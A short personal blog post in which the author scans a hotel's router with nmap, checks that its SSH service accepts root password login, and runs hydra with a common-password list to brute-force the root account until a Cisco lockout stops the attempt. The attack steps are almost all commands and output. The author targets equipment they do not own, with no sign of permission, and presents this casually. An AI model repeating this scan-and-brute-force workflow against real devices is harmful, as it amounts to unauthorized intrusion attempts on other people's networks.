---
title: Scan An Open ssh Port
lang: en-US
date: 2020-06-01
tags: [ network ]

---

I was living in a hotel in the quarantine time, which has a very bad network.
While I was doing some network configuration checking, I accidentally found the ssh port of the router is open.

<!-- more -->

## Scan open ports

I was scanning the router for an open HTTP port where I found its ssh port opening.
``` bash
    nmap $TARGET_IP
```

## Check ssh authentication

Further check if it accepts `root` remote connect and password authentications.
``` bash
ssh -v -n \
    -o Batchmode=yes \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    root@$TARGET_IP 2>&1 | grep password
```

Turns out it does!
``` bash
debug1: Authentications that can continue: password
Permission denied (password).
```

## Try brute force the password
Use a [dictionary](https://github.com/danielmiessler/SecLists)
``` bash
    hydra -l root -P top-20-common-SSH-passwords.txt $TARGET_IP -t 4 ssh
```

## User locked
After 10 tries, the `root` was locked.
Looks like it is a Cisco router with [Login Password Retry Lockout](https://www.cisco.com/en/US/docs/ios-xml/ios/sec_usr_aaa/configuration/15-2mt/sec-login-pw-retry.html#GUID-CA5A3F7D-E324-490E-B551-802924411091).
Had to admit it is secure to me :relieved:.

## Reference
- [https://serverfault.com/questions/938149/how-to-test-if-ssh-server-allows-passwords](https://serverfault.com/questions/938149/how-to-test-if-ssh-server-allows-passwords)

